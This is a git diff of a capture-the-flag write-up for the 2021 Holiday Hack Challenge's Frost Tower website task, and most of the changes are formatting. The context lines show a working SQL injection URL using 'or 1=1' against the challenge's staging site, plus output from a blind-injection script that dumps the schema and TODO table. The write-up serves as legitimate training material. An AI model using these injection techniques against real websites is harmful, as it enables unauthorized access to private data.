@@ -4,7 +4,7 @@
 Difficulty: :christmas_tree::christmas_tree::christmas_tree::christmas_tree::christmas_tree:  
 Investigate [Frost Tower's website for security issues](https://staging.jackfrosttower.com/). [This source code will be useful in your analysis](https://download.holidayhackchallenge.com/2021/frosttower-web.zip). In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you.
 
-### 12.1. Side Challenge - The Elf C0de Python Edition
+### 12.1. [Side Challenge - The Elf C0de Python Edition](/12.%20Frost%20Tower%20Website%20Checkup/12.01.%20Side%20Challenge%20-%20The%20Elf%20C0de%20Python%20Edition/README.md)
 
 ### 12.2. Hints
 **SQL Injection with Source** - *Ribb Bonbowford*: “When you have the source code, API documentation becomes [tremendously valuable](https://www.npmjs.com/package/express-session).”
@@ -57,10 +57,9 @@ app.get('/detail/:id', function(req, res, next) {
 });
 ```
 
-
 Notice that the IDs 'I-do-not-exist' and 'I-also-do-not-exist' do not exist:  
 ![04_non_existent_values](imgs/04_non_existent_values.png)  
-Then confirm the SQL injection by accessing the URL https://staging.jackfrosttower.com/detail/'I-do-not-exist','I-also-do-not-exist'%20or%201=1 with a valid session and still retieving all the content of the uniquecontact table is printed due to the “ or 1=1” part of the parameters:  
+Then confirm the SQL injection by accessing the URL https://staging.jackfrosttower.com/detail/'I-do-not-exist','I-also-do-not-exist'%20or%201=1 with a valid session and still retieving all the content of the `uniquecontact` table is printed due to the ` or 1=1` part of the parameters:  
 ![05_SQLi](imgs/05_SQLi.png)  
 
 The real problem with this SQL injection is to avoid the usage of commas as the endpoint splits IDs on that character. Also, not being able to use UNION to obtain further values, I resurrected my [handy python script for blind SQL injections](https://github.com/LamonatoAndrea/KringleCon2/blob/master/01%20-%20Primary%20Objectives/09%20-%20Retrieve%20Scraps%20of%20Paper%20from%20Server/students.py) and slightly readapted it for the purpose.
@@ -157,7 +156,7 @@ def sendRequest (baseUrl, sleepTime):
     return response
 ```
 
-A first run shown the table “TODO” that was not present in the given [encontact_db.sql](frosttower-web/sql/encontact_db.sql):
+A first run shown the table `TODO` that was not present in the given [encontact_db.sql](frosttower-web/sql/encontact_db.sql):
 ```
 ┌──(thedead㉿thinkali)-[~/Desktop/repos/Kringlecon4/12) Frost Tower Website Checkup]
 └─$ python2 frost_tower_SQLi.py 2>frost_tower_SQLi_stderr1.txt
@@ -179,7 +178,7 @@ Table Schema encontact Table todo column completed has type TINYINT
 Table Schema encontact Table todo Columns [{'columnName': 'id', 'columnType': 'INT', 'isPK': True}, {'columnName': 'note', 'columnType': 'VARCHAR', 'isPK': False}, {'columnName': 'completed', 'columnType': 'TINYINT', 'isPK': False}]
 ```
 
-From column “note” of “TODO” table it is possible to extract the challenge answer using the very same SQL injection technique and having a LOT of time to wait & waste:
+From column `note` of `TODO` table it is possible to extract the challenge answer using the very same SQL injection technique and having a *LOT* of time to wait & waste:
 ```
 Table todo has 9 rows
 Table todo row#0 has content [1, "Buy up land all around Santa's Castle", 1]
